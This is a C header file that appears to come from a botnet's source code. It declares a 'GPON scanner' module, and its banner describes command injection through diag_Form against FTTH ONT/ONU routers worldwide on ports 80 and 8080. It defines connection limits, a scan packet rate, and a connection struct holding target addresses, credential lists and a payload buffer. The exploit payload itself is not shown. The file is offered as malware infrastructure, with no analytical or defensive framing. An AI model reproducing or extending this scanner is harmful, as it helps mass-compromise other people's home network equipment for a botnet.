#ifndef _GPON_SCANNER_H
#define _GPON_SCANNER_H

/* ============================================================================
 * GPON SCANNER - FTTH/ONT Command Injection (Ports 80, 8080)
 * ============================================================================
 * Exploit: GPON/ONT command injection via diag_Form
 * Targets: FTTH ONT/ONU devices globally
 * Regions: Latin America, Asia, Middle East, Africa, Europe
 * Brands: Various GPON equipment manufacturers
 * ============================================================================ */

#include "includes.h"

/* GPON scanner configuration */
#define GPON_SCANNER_MAX_CONNS 128
#define GPON_SCANNER_RAW_PPS 64
#define GPON_SCANNER_RDBUF_SIZE 2048
#define GPON_SCANNER_HACK_DRAIN 64

/* Connection structure */
struct gpon_scanner_connection {
    int fd;
    ipv4_t dst_addr;
    uint16_t dst_port;
    uint8_t state;
    time_t last_recv;
    int credential_index;
    char **credentials;
    char rdbuf[GPON_SCANNER_RDBUF_SIZE];
    int rdbuf_pos;
    char payload_buf[2048];
};

void gpon_scanner_init(void);
void gpon_kill(void);

#endif
